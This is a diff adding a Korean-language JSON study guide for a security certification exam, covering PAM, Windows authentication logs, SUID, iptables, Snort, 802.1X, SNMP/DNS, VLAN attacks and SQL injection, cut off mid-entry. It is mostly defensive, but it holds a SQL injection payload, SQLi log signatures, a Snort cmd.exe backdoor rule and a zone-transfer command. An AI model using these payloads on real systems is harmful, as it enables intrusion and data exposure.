@@ -1,0 +1,1217 @@
+{
+  "CON-SYS-01": {
+    "concept_id": "CON-SYS-01",
+    "summary": "유닉스/리눅스 환경의 사용자 계정 관리, r-commands(hosts.equiv) 신뢰 관계 통제, 그리고 애플리케이션의 인증 메커니즘을 모듈화하여 유연하게 통합 제어하는 PAM(Pluggable Authentication Modules)의 구조와 제어 플래그를 다룹니다.",
+    "core_points": [
+      "PAM 4대 모듈 인터페이스: auth(사용자 인증), account(계정 유효성/접근 권한), password(비밀번호 갱신/복잡도), session(환경 설정 및 자원 제한)",
+      "PAM 4대 제어 플래그: required(실패시 지연 거부), requisite(실패시 즉시 거부), sufficient(이전 성공시 즉시 성공 승인), optional(성패 영향 없음)",
+      "r-commands(rsh, rlogin, rcp) 보안 위협: /etc/hosts.equiv 및 ~/.rhosts 파일의 '+' 와일드카드 설정 취약점 점검 및 제거",
+      "계정 잠금 임계값 설정: pam_faillock / pam_tally2 모듈을 통한 무차별 대입 공격(Brute Force) 방어",
+      "패스워드 복잡도 및 수명 정책: /etc/login.defs 및 /etc/security/pwquality.conf 설정"
+    ],
+    "mechanism": "사용자가 서비스(su, sshd 등)에 접근할 때 서비스는 /etc/pam.d/<서비스명> 스택을 호출합니다. PAM 라이브러리는 등록된 모듈들을 위에서 아래로 순차 실행하며, 각 모듈의 반환값과 제어 플래그(required, requisite, sufficient, optional)의 조합에 따라 최종 성공/실패 여부를 결정합니다. required는 실패하더라도 전체 스택을 계속 수행하여 공격자에게 어떤 검증이 실패했는지 숨기며, requisite는 실패 즉시 평가를 종료합니다.",
+    "exam_points": [
+      "/etc/pam.d/system-auth 또는 password-auth 파일에서 pam_faillock 설정 지시자 (deny, unlock_time, even_deny_root) 작성",
+      "/etc/hosts.equiv 및 ~/.rhosts 파일 소유자(root 또는 해당 사용자) 및 권한(600 이하), '+' 설정 제거 조치 방안 서술",
+      "PAM 4대 제어 플래그 동작 방식 및 반환값에 따른 스택 실행 분기 분석",
+      "단답형 빈출: auth, account, password, session 각 인터페이스의 기능 매핑"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "required와 requisite를 동일한 필수 검사로 혼동하여 '둘 다 실패 즉시 종료된다'고 서술",
+        "clarification": "required는 실패하더라도 스택 끝까지 모듈을 계속 실행한 후 최종 실패를 반환(지연 거부)하며, 실패 즉시 스택을 중단하는 것은 requisite입니다."
+      },
+      {
+        "trap": "account 모듈의 역할을 패스워드 검증이라고 작성",
+        "clarification": "사용자 자격증명(비밀번호 등)을 검증하는 것은 auth 모듈이며, account 모듈은 계정 만료일, 접근 허용 시간대, 비밀번호 만료 여부 등 '계정 자체의 상태'를 점검합니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-SYS-02",
+        "target_name": "Windows 로컬 인증 및 로그 관리",
+        "difference": "Linux의 텍스트 기반 PAM 모듈 스택 및 UGO 권한과 대비되는 Windows의 LSA/SAM 커널 서브시스템 및 NTLM/Kerberos 토큰 기반 인증 구조"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "계정 잠금 설정 (pam_faillock 예시)",
+        "code": "auth        required      pam_faillock.so preauth silent audit deny=5 unlock_time=900\nauth        [default=die] pam_faillock.so authfail audit deny=5 unlock_time=900\naccount     required      pam_faillock.so",
+        "explanation": "5회 인증 실패 시 900초(15분) 동안 계정을 잠금 처리하며 감사 로그를 남깁니다."
+      },
+      {
+        "title": "r-commands 취약 파일 점검 명령어",
+        "code": "ls -l /etc/hosts.equiv ~/.rhosts\ngrep -E '\\+' /etc/hosts.equiv 2>/dev/null",
+        "explanation": "신뢰 호스트 파일에 '+' 설정이 존재하는지 확인하여 원격 무인증 접속 취약점을 점검합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-02",
+        "page_hint": "p.14-25",
+        "relevance": "리눅스 PAM 설정 및 r-commands 취약점 기출 서술형 모범답안"
+      },
+      {
+        "source_id": "SRC-05",
+        "page_hint": "p.8-15",
+        "relevance": "시스템 보안 단권화 요약 - 계정 및 접근통제 핵심 점검 항목"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "주요정보통신기반시설 기술적 취약점 분석 가이드 및 리눅스 표준 PAM 규격과 정확히 일치합니다."
+    }
+  },
+  "CON-SYS-02": {
+    "concept_id": "CON-SYS-02",
+    "summary": "Windows 운영체제의 핵심 로컬 보안 서브시스템인 LSA, SAM, SRM의 인증 흐름, 고유 보안 식별자(SID)의 구조, 감사 추적을 위한 이벤트 로그 및 IIS/HTTPERR 웹 로그 분석 기법을 다룹니다.",
+    "core_points": [
+      "Windows 인증 서브시스템 3요소: LSA(로컬 보안 기관, 인증 및 토큰 발급), SAM(보안 계정 관리자, 로컬 계정/패스워드 해시 DB), SRM(보안 참조 모니터, 객체 접근 권한 검사)",
+      "SID(Security Identifier) 구조: S-1-5-21-...-500(기본 Administrator), -501(Guest), 도메인/시스템 고유 식별자",
+      "주요 감사 이벤트 ID: 4624(로그온 성공), 4625(로그온 실패), 4672(특권 할당/관리자 권한), 4720(계정 생성), 4740(계정 잠금)",
+      "로그온 유형(Logon Type): 2(대화형 콘솔), 3(네트워크 공유/IIS), 10(원격 데스크톱 RDP)",
+      "IIS W3C 웹 로그 경로(%SystemDrive%\\inetpub\\logs\\LogFiles) 및 HTTP 오류 로그(HTTPERR, C:\\Windows\\System32\\LogFiles\\HTTPERR)"
+    ],
+    "mechanism": "사용자가 로그인 자격증명을 입력하면 Winlogon이 LSA에 인증을 요청합니다. LSA는 Kerberos(도메인) 또는 NTLM(로컬 SAM 쿼리)을 통해 인증을 검증한 후 액세스 토큰(Access Token)을 생성합니다. 사용자가 프로세스나 파일에 접근할 때 커널 모드의 SRM이 액세스 토큰 내의 SID와 객체의 DACL(임의 접근 통제 목록)을 대조하여 접근 허용/거부를 판정합니다.",
+    "exam_points": [
+      "이벤트 로그 ID 4624/4625 분석 시 Logon Type 2, 3, 10 식별 및 무차별 대입 공격 공격지 IP 추적",
+      "LSA, SAM, SRM 서브시스템의 각 역할 및 상호작용 흐름 서술",
+      "Administrator 기본 SID 끝자리 500(RID)과 Guest 501 식별",
+      "IIS 웹 로그의 cs-method, cs-uri-stem, sc-status 필드 분석을 통한 웹 공격(SQLi, 디렉터리 탐색) 추적"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "Logon Type 10을 로컬 키보드 콘솔 로그인으로 혼동",
+        "clarification": "Logon Type 2가 로컬 키보드 대화형 로그인(Interactive)이며, Logon Type 10은 터미널 서비스/원격 데스크톱(RDP) 로그인입니다."
+      },
+      {
+        "trap": "SRM이 사용자 인증 및 토큰 발급을 담당한다고 서술",
+        "clarification": "인증 및 토큰 발급은 LSA가 전담하며, SRM(Security Reference Monitor)은 발급된 토큰을 이용해 자원에 대한 DACL 접근 권한을 최종 심사하는 커널 모듈입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-SYS-01",
+        "target_name": "유닉스/리눅스 계정 및 접근통제",
+        "difference": "Linux의 UID/GID(정수형)와 /etc/passwd 대비 Windows의 복합 가변 길이 SID 및 SAM 레지스트리 하이브 구조"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "현재 사용자 SID 확인 명령어",
+        "code": "whoami /user\nwhoami /priv",
+        "explanation": "현재 세션의 고유 SID(RID 500 등)와 활성화된 보안 특권(SeDebugPrivilege 등)을 조회합니다."
+      },
+      {
+        "title": "로그온 감사 실패(4625) PowerShell 조회",
+        "code": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 10 | Format-List TimeCreated, Message",
+        "explanation": "최근 10건의 로그인 실패 감사 이벤트를 조회하여 무차별 대입 공격 징후를 분석합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-05",
+        "page_hint": "p.20-31",
+        "relevance": "Windows 보안 서브시스템 및 이벤트 로그 식별 단권화 요약"
+      },
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.18-22",
+        "relevance": "Windows RID 및 이벤트 로그 ID 기출 단답형 문항"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "Windows Server 2019/2022 및 이벤트 로그 표준 스키마와 완벽히 호환됩니다."
+    }
+  },
+  "CON-SYS-03": {
+    "concept_id": "CON-SYS-03",
+    "summary": "리눅스 가상 파일시스템(/proc), 프로세스 생명주기 및 은닉 프로세스 추적, 파일시스템의 inode 구조, MAC Time의 의미, 그리고 SUID/SGID/Sticky bit 특수 권한 관리와 umask 계산 원리를 다룹니다.",
+    "core_points": [
+      "특수 권한 3종: SUID(4000, 실행 시 소유자 권한 획득), SGID(2000, 실행 시 그룹 권한/디렉터리 내 생성 파일 그룹 상속), Sticky bit(1000, 공용 디렉터리에서 소유자만 삭제 가능)",
+      "umask 계산 원리: 디렉터리 최대 권한 777, 일반 파일 최대 권한 666(실행 권한 배제)에서 umask 비트 감산",
+      "inode 구조 및 MAC Time: mtime(내용 수정), atime(접근), ctime(메타데이터/권한 변경)",
+      "/proc 가상 파일시스템: 메모리 기반 커널 정보 매핑, /proc/<PID>/cmdline, /proc/<PID>/exe, /proc/<PID>/fd",
+      "은닉 프로세스 분석: ps 명령어 변조 시 /proc 디렉터리와 ps 출력 비교, lsof를 통한 열린 포트/소켓 매핑"
+    ],
+    "mechanism": "파일이 실행될 때 SUID 비트가 설정되어 있으면 OS 커널은 프로세스의 유효 사용자 ID(EUID)를 실행자의 실제 사용자 ID(RUID)가 아닌 파일 소유자(예: root)의 UID로 전환합니다. 취약한 프로그램에 SUID가 부여되면 권한 상승(Privilege Escalation) 백도어로 악용될 수 있습니다.",
+    "exam_points": [
+      "SetUID root 파일 검색 find 명령어 작성: find / -user root -perm -4000 -exec ls -ld {} \\;",
+      "umask 027 적용 시 파일(640) 및 디렉터리(750) 기본 생성 권한 계산",
+      "MAC Time 분석: 파일 내용 수정 시 mtime과 ctime 동시 변경, chmod 실행 시 ctime만 변경됨을 식별",
+      "/proc 디렉터리를 이용한 프로세스 실행 경로(/proc/PID/exe) 및 은닉 악성코드 추적 절차"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "일반 파일의 기본 권한을 777로 가정하고 umask 022를 빼서 755라고 계산",
+        "clarification": "일반 텍스트 파일은 생성 시 기본적으로 실행 권한이 부여되지 않으므로 666에서 시작합니다. 따라서 666 - 022 = 644입니다."
+      },
+      {
+        "trap": "ctime을 파일의 생성 시간(Creation Time)으로 오해",
+        "clarification": "유닉스 전통 파일시스템에서 ctime은 Creation Time이 아니라 'Change Time'(메타데이터 또는 소유권/권한 변경 시간)입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-SYS-01",
+        "target_name": "유닉스/리눅스 계정 및 접근통제",
+        "difference": "사용자 및 PAM 차원의 인증 제어와 대비되는 파일시스템 수준의 권한(UGO/특수비트) 및 프로세스 격리 체계"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "SetUID 파일 무단 설정 전수 점검",
+        "code": "find / -xdev -user root -perm -4000 -type f -exec ls -al {} \\;",
+        "explanation": "로컬 파일시스템 내 root 소유의 SetUID 실행 파일을 추출하여 권한 상승 공격 가능성을 점검합니다."
+      },
+      {
+        "title": "특정 프로세스의 실제 실행 파일 링크 확인",
+        "code": "ls -l /proc/1234/exe\ncat /proc/1234/cmdline",
+        "explanation": "PID 1234의 실제 바이너리 위치와 실행 당시 전달된 인자값을 /proc 가상 파일시스템에서 직접 확인합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-06",
+        "page_hint": "p.45-62",
+        "relevance": "수제비 1과목 시스템 보안 - 프로세스 관리 및 inode/파일시스템 이론"
+      },
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.24-28",
+        "relevance": "특수 권한 및 umask 계산 기출 단답형 문제"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "POSIX 표준 및 리눅스 파일시스템 아키텍처와 일치합니다."
+    }
+  },
+  "CON-NET-01": {
+    "concept_id": "CON-NET-01",
+    "summary": "네트워크 계층의 패킷 분석 및 공격 탐지를 위한 IPTables의 3대 기본 체인과 상태 추적 메커니즘, Snort 침입탐지시스템(IDS)의 룰 헤더 및 페이로드 탐지 옵션 문법을 심도 있게 다룹니다.",
+    "core_points": [
+      "IPTables 기본 체인: INPUT(호스트 수신), FORWARD(호스트 경유 패킷 라우팅), OUTPUT(호스트 생성 송신)",
+      "IPTables 상태 추적(state 모듈): NEW, ESTABLISHED, RELATED, INVALID 상태 판별",
+      "비정상 TCP 연결 차단: iptables -A INPUT -p tcp ! --syn -m state --state NEW -j DROP (SYN 없이 들어오는 NEW 패킷 차단)",
+      "Snort 룰 구조: Rule Header (Action Protocol SrcIP SrcPort -> DstIP DstPort) + Rule Options (msg, content, offset, depth, distance, within, nocase, sid, rev)",
+      "Snort 상대 검색 옵션: distance(이전 content 매칭 후 건너뛸 바이트), within(검색할 최대 바이트 범위)"
+    ],
+    "mechanism": "IPTables는 Netfilter 프레임워크 위에서 패킷의 5-tuple(프로토콜, 송신IP/Port, 수신IP/Port)과 상태를 검사합니다. Snort는 네트워크 인터페이스를 Promiscuous 모드로 동작시켜 패킷을 수집한 후, 룰 헤더 조건이 일치하면 페이로드 옵션(content 등)을 순차 검사하여 패턴 일치 시 alert/drop 조치를 수행합니다.",
+    "exam_points": [
+      "IPTables 특정 IP 대역 차단 및 SSH(22) 허용 정책 룰셋 작성",
+      "iptables의 '! --syn -m state --state NEW' 지시자의 공격 방어 원리(비정상 플래그 스캔 차단) 서술",
+      "Snort 룰 헤더의 방향 연산자(->, <>), any 포트, 부정 연산자(!) 문법",
+      "Snort 옵션 중 content, offset, depth, nocase, sid(9자리 번호)를 조합한 침해 탐지 룰 작성"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "Snort 룰에서 양방향 트래픽을 표현할 때 '<-' 연산자 사용",
+        "clarification": "Snort 룰 헤더는 단방향 '->'과 양방향 '<>'만 지원하며, 역방향 '<-' 연산자는 존재하지 않습니다."
+      },
+      {
+        "trap": "IPTables의 FORWARD 체인을 호스트 자신으로 들어오는 패킷 필터링 체인으로 기술",
+        "clarification": "호스트 자신이 목적지인 패킷은 INPUT 체인을 통과하며, FORWARD 체인은 호스트를 라우터처럼 통과하여 다른 목적지로 전달되는 패킷만 통과합니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-NET-02",
+        "target_name": "무선랜 보안 및 네트워크 인증",
+        "difference": "L3/L4 계층의 IP/포트 기반 필터링 및 시그니처 분석과 대비되는 L2 무선 매체 프레임 암호화 및 802.1X 포트 인증"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "IPTables 웹서버 DoS 방어 기본 룰",
+        "code": "iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m limit --limit 50/minute --limit-burst 100 -j ACCEPT",
+        "explanation": "초당 새로운 웹 접속 요청의 한도를 제한하여 SYN Flood 및 대량 연결 DoS를 방어합니다."
+      },
+      {
+        "title": "Snort 웹 백도어(cmd.exe) 탐지 룰",
+        "code": "alert tcp any any -> any 80 (msg:\"Web Backdoor cmd.exe detected\"; content:\"/cmd.exe\"; nocase; sid:1000001; rev:1;)",
+        "explanation": "웹 요청 URI에 대소문자 구분 없이 /cmd.exe가 포함되어 있으면 경고를 발생시킵니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-04",
+        "page_hint": "p.78-112",
+        "relevance": "수제비 4과목 보안 운영 도구 - Snort 룰 문법 및 iptables 체계"
+      },
+      {
+        "source_id": "SRC-03",
+        "page_hint": "p.8-15",
+        "relevance": "실기 서술형 TOP 20 - Snort 룰 작성 및 패킷 분석 심층 루브릭"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "Netfilter IPTables 및 Snort v2/v3 표준 룰셋 규격과 일치합니다."
+    }
+  },
+  "CON-NET-02": {
+    "concept_id": "CON-NET-02",
+    "summary": "무선랜 환경의 표준 보안 규격인 IEEE 802.11i(WPA2), 포트 기반 네트워크 접근 제어인 IEEE 802.1X의 구조, EAP 인증 프로토콜, 강력한 AES-CCMP 암호화 및 무선 보안 통제 정책을 다룹니다.",
+    "core_points": [
+      "무선 보안 규격 발전: WEP(RC4, IV 24비트 결함 취약) → WPA(TKIP, 임시 대응) → WPA2(IEEE 802.11i, AES-CCMP 필수) → WPA3(SAE 인증, 완전 순방향 비밀성)",
+      "AES-CCMP 메커니즘: CTR 모드(데이터 기밀성 제공) + CBC-MAC(데이터 무결성 및 인증 제공)",
+      "IEEE 802.1X 3자 구조: Supplicant(인증 클라이언트), Authenticator(접근점 AP 또는 L2 스위치), Authentication Server(RADIUS 서버)",
+      "EAP(Extensible Authentication Protocol) 유형: EAP-TLS(상호 인증서), EAP-TTLS/PEAP(서버만 인증서, 클라이언트는 ID/PW)",
+      "WPA2-PSK 4-Way Handshake 취약점: 사전 공격 및 무차별 대입 공격에 의한 PMK 유추 위협"
+    ],
+    "mechanism": "802.1X 환경에서 Supplicant가 네트워크에 접속을 시도하면 Authenticator는 인증 전까지 무조건 차단 포트 상태를 유지합니다. 클라이언트와 RADIUS 서버 간에 EAP 메시지가 교환되어 상호 인증이 완료되면, RADIUS 서버가 마스터 키(MSK)를 생성하여 분배하고 Authenticator의 포트가 인가(Authorized) 상태로 열립니다.",
+    "exam_points": [
+      "WEP 취약점 원인(RC4 알고리즘의 짧은 IV 재사용 및 약한 키 스케줄링) 서술",
+      "IEEE 802.1X의 3대 구성 요소(Supplicant, Authenticator, Authentication Server) 단답형 기출",
+      "WPA2에서 채택한 암호화 방식인 AES-CCMP(CTR + CBC-MAC)의 결합 원리 서술",
+      "무선 AP 보안 설정: WPA2-Enterprise 적용, 관리자 비밀번호 변경, 내부망과의 망분리"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "WPA2의 핵심 암호 알고리즘을 TKIP으로 작성",
+        "clarification": "TKIP은 구형 WPA1에서 과도기적으로 사용한 방식이며, WPA2의 표준 암호 알고리즘은 AES 기반의 CCMP입니다."
+      },
+      {
+        "trap": "Authenticator의 역할을 RADIUS 인증 서버로 혼동",
+        "clarification": "Authenticator는 무선 AP나 L2 스위치 장비이며, 실제 계정 데이터베이스를 검증하는 Authentication Server가 RADIUS 서버입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-NET-01",
+        "target_name": "네트워크 패킷 분석 및 방화벽/탐지",
+        "difference": "L3 방화벽 패킷 필터링과 대비되는 L2 무선 물리/데이터링크 계층의 프레임 암호화 및 포트 기반 인증 통제"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "리눅스 wpa_supplicant 802.1X 설정 예시",
+        "code": "network={\n    ssid=\"CorpSecure\"\n    key_mgmt=WPA-EAP\n    eap=PEAP\n    identity=\"user01\"\n    password=\"SecurePass123!\"\n}",
+        "explanation": "기업용 WPA2-Enterprise 망에 PEAP 방식으로 인증하는 클라이언트 설정 파일입니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-07",
+        "page_hint": "p.120-145",
+        "relevance": "수제비 2과목 네트워크 보안 - 무선랜 보안 및 802.1X 이론"
+      },
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.32-35",
+        "relevance": "802.1X 구성 요소 및 WPA2 암호화 기출 단답형 문항"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "IEEE 802.11i 및 802.1X 국제 표준 규격과 일치합니다."
+    }
+  },
+  "CON-NET-03": {
+    "concept_id": "CON-NET-03",
+    "summary": "네트워크 관리 및 모니터링 프로토콜인 SNMP의 버전별 보안 취약점과 개선 사항(v1/v2c vs v3), DNS 인프라 보안 및 영역 전송(Zone Transfer) 취약점, 라우팅 프로토콜(RIP, OSPF, BGP)의 보안 특성을 다룹니다.",
+    "core_points": [
+      "SNMP v1/v2c 보안 취약점: 평문 전송(Cleartext) Community String(public, private) 사용으로 스니핑 및 무단 설정 변경 노출",
+      "SNMP v3 보안 강화: USM(User-based Security Model, 인증/암호화) 및 VACM(View-based Access Control Model) 도입, noAuthNoPriv / authNoPriv / authPriv 보안 레벨 지원",
+      "SNMP 보안 수칙: Community String 복잡도 강화, 기본값(public/private) 변경, 쓰기 권한(RW) 비활성화 및 읽기 전용(RO) 적용, 관리자 IP ACL 설정",
+      "DNS 보안: 53번 포트(UDP 기본 질의, TCP Zone Transfer/512바이트 초과), 비인가 Zone Transfer(axfr) 차단, DNSSEC(전자서명을 통한 캐시 포이즈닝 방어)",
+      "라우팅 프로토콜 인증: RIPv2/OSPF MD5 인증 적용을 통한 허위 경로 주입 공격 차단"
+    ],
+    "mechanism": "SNMP는 161번 UDP 포트(Agent)와 162번 UDP 포트(Trap)를 사용합니다. v1/v2c는 패킷에 평문 커뮤니티 스트링을 담아 보내므로 중간자 공격에 매우 취약합니다. v3는 HMAC-SHA/MD5 인증과 AES/DES 암호화를 적용하여 무결성과 기밀성을 모두 보장합니다.",
+    "exam_points": [
+      "SNMP 기본 Community String(public, private) 위험성 및 보안 조치 3가지 서술",
+      "SNMP v3 3단계 보안 모델(noAuthNoPriv, authNoPriv, authPriv) 구분",
+      "DNS Zone Transfer 취약점 점검 명령어(dig @nameserver domain axfr) 및 named.conf allow-transfer 설정 작성",
+      "DNS Cache Poisoning 원리와 DNSSEC 도입의 목적 서술"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "SNMP Agent의 기본 포트를 UDP 162번으로 작성",
+        "clarification": "일반적인 SNMP 질의/응답을 수신하는 Agent의 포트는 UDP 161번이며, 비동기 알림을 NMS로 전송하는 SNMP Trap 포트가 UDP 162번입니다."
+      },
+      {
+        "trap": "DNS 서비스가 항상 UDP만 사용한다고 기술",
+        "clarification": "일반 클라이언트 질의는 UDP 53번을 사용하지만, 대량의 존 전송(Zone Transfer)이나 DNSSEC 등으로 패킷 크기가 512바이트를 초과하면 TCP 53번을 사용합니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-NET-01",
+        "target_name": "네트워크 패킷 분석 및 방화벽/탐지",
+        "difference": "방화벽 룰 기반 차단과 대비되는 애플리케이션 계층 관리 서비스(SNMP, DNS)의 프로토콜 자체 보안 설정 및 취약점 통제"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "DNS Zone Transfer 취약점 점검 (dig)",
+        "code": "dig @ns1.target.com target.com axfr",
+        "explanation": "비인가 존 전송을 시도하여 전체 서브도메인 및 내부 네트워크 정보가 유출되는지 점검합니다."
+      },
+      {
+        "title": "BIND named.conf 존 전송 제한 설정",
+        "code": "options {\n    allow-transfer { 192.168.1.10; }; // 보조 네임서버 IP만 명시\n};",
+        "explanation": "인가된 보조 네임서버 외의 외부 호스트에서 존 전송을 요청하는 행위를 원천 차단합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-02",
+        "page_hint": "p.36-48",
+        "relevance": "SNMP 보안 점검 및 DNS Zone Transfer 차단 기출 서술형 문제"
+      },
+      {
+        "source_id": "SRC-07",
+        "page_hint": "p.210-235",
+        "relevance": "수제비 2과목 - 네트워크 서비스 및 프로토콜 취약점 이론"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "주요정보통신기반시설 기술적 취약점 가이드 및 IETF RFC 표준과 일치합니다."
+    }
+  },
+  "CON-NET-04": {
+    "concept_id": "CON-NET-04",
+    "summary": "네트워크 스위칭 인프라의 핵심 분할 기술인 가상 로컬 영역 네트워크(VLAN)의 구성 방식(포트 기반 정적 VLAN, MAC 기반 동적 VLAN), IEEE 802.1Q 프레임 태깅 규격, 그리고 L2 스위치 계층 공격 기법(ARP 스푸핑, MAC Flooding, VLAN Hopping)을 다룹니다.",
+    "core_points": [
+      "VLAN 분할 목적: 브로드캐스트 도메인 격리를 통한 네트워크 성능 최적화 및 보안 세그먼트 분리",
+      "VLAN 구현 방식: 정적 VLAN(Port-based, 물리적 포트 고정 매핑), 동적 VLAN(MAC-based / Subnet-based / User-based)",
+      "IEEE 802.1Q 트렁킹: 이더넷 프레임에 4바이트 태그(TPID 0x8100, TCI의 VLAN ID 12비트)를 삽입하여 단일 물리 링크로 다중 VLAN 트래픽 전송",
+      "L2 스위치 공격 기법: MAC Flooding(스위치 MAC 테이블을 무차별 채워 허브처럼 동작 유도), ARP Spoofing(가짜 ARP 응답으로 중간자 공격), VLAN Hopping(Double Tagging을 통한 이종 VLAN 침투)",
+      "L2 방어 기술: Port Security(포트별 허용 MAC 개수 제한 및 위반 시 shutdown), Dynamic ARP Inspection(DAI), DHCP Snooping"
+    ],
+    "mechanism": "스위치 포트가 Access 모드일 때는 태그 없는 일반 프레임이 송수신됩니다. 스위치 간을 연결하는 Trunk 포트를 통과할 때 스위치는 프레임 헤더 뒤에 IEEE 802.1Q 태그(12비트 VID, 1~4094)를 부착하여 전송하고, 수신 스위치는 태그를 해석하여 동일한 VID에 속한 포트로만 프레임을 전달합니다.",
+    "exam_points": [
+      "포트 기반 정적 VLAN과 MAC 기반 동적 VLAN의 동작 차이점 및 장단점 서술",
+      "IEEE 802.1Q 태그의 구조(TPID, VID 12비트 크기 및 표현 가능한 최대 VLAN 수 4096개) 단답형 기출",
+      "스위치 MAC Flooding 공격의 원리(Fail-open 유도) 및 Port Security를 이용한 방어 대책 서술",
+      "Trunk 포트 설정 시 Native VLAN 변경(기본 1번 사용 금지)을 통한 VLAN Hopping 방어"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "VLAN ID(VID)의 비트 수를 8비트(256개) 또는 16비트(65536개)로 작성",
+        "clarification": "IEEE 802.1Q 헤더에서 VLAN ID를 지정하는 필드는 정확히 12비트이며, 이론적으로 4,096(0~4095)개의 식별자를 지원합니다."
+      },
+      {
+        "trap": "스위치는 버퍼가 가득 차면 모든 패킷을 폐기(Fail-close)한다고 가정",
+        "clarification": "스위치의 MAC 주소 테이블이 넘치면(MAC Flooding) 스위치는 들어오는 모든 패킷을 모든 포트로 브로드캐스트하는 허브(Fail-open)처럼 동작하여 스니핑이 가능해집니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-NET-01",
+        "target_name": "네트워크 패킷 분석 및 방화벽/탐지",
+        "difference": "L3 라우팅 테이블 및 IP 패킷 필터링과 대비되는 L2 데이터링크 계층의 브로드캐스트 도메인 분리 및 트렁크 태깅"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "Cisco 스위치 Port Security 설정 예시",
+        "code": "switchport mode access\nswitchport port-security\nswitchport port-security maximum 2\nswitchport port-security violation shutdown",
+        "explanation": "해당 포트에 접속 가능한 MAC 주소를 최대 2개로 제한하고, 위반 시 포트를 즉시 차단(shutdown)합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-07",
+        "page_hint": "p.88-105",
+        "relevance": "수제비 2과목 - VLAN 인프라 및 스위칭 보안 이론"
+      },
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.36-39",
+        "relevance": "VLAN 태깅 및 L2 스위치 공격 기출 단답형 문제"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "IEEE 802.1Q 표준 규격과 일치합니다."
+    }
+  },
+  "CON-APP-01": {
+    "concept_id": "CON-APP-01",
+    "summary": "OWASP Top 10의 대표적인 취약점인 SQL Injection의 원리, 에러 기반/Blind(Boolean, Time)/Union SQLi의 차이점, 아파치 access.log 기반 공격 침해 흔적 분석, 그리고 매개변수화된 쿼리(Prepared Statement)를 이용한 원천 방어 기법을 다룹니다.",
+    "core_points": [
+      "SQL Injection 공격 원리: 사용자 입력값이 검증 없이 동적 SQL 쿼리 문자열로 결합되어 개발자의 의도와 다른 임의의 쿼리가 실행되는 결함",
+      "SQLi 유형: Error-based(DB 에러 메시지로 데이터 탈취), Union-based(정상 쿼리에 UNION 결합하여 출력), Blind SQLi(에러 미출력 시 참/거짓 응답 차이 또는 sleep 함수 시간 지연으로 유추)",
+      "웹 서버 로그 분석: Apache access.log에서 SELECT, UNION, OR 1=1, SLEEP, CHAR, %27(따옴표) 등의 공격 패턴 및 HTTP 응답 코드(200, 500) 분석",
+      "원천 방어 대책: PreparedStatement(매개변수화된 쿼리) 적용을 통해 사용자 입력값을 쿼리 구조가 아닌 단순 데이터 리터럴로 취급",
+      "추가 방어: 입력값 화이트리스트 검증, 특수문자 이스케이프, DB 계정 권한 최소화 및 상세 에러 메시지 노출 차단"
+    ],
+    "mechanism": "동적 문자열 조작(예: \"SELECT * FROM users WHERE id = '\" + id + \"'\") 방식은 악의적인 따옴표(' OR '1'='1) 입력 시 쿼리의 문법적 구조를 변형시킵니다. Prepared Statement를 사용하면 DB 드라이버가 먼저 쿼리 문법 트리(AST)를 컴파일한 후 파라미터 자리에 데이터를 순수 값(Literal)으로만 바인딩하므로 문법 구조 변경이 원천 불가능합니다.",
+    "exam_points": [
+      "웹 서버 access.log 기록(URL 디코딩, 인젝션 구문 식별)을 보고 공격 기법(Blind SQLi 등) 판별 서술",
+      "PreparedStatement의 보안 방어 메커니즘(문법 트리 선컴파일 및 데이터 바인딩) 서술",
+      "Blind SQL Injection 탐지 기법 2가지(Boolean-based, Time-based)의 작동 원리 서술",
+      "MyBatis 환경에서 안전한 바인딩(#{param})과 안전하지 않은 문자열 결합(${param}) 구분"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "Blind SQL Injection 방어책으로 '에러 메시지 미출력 설정'만을 기술",
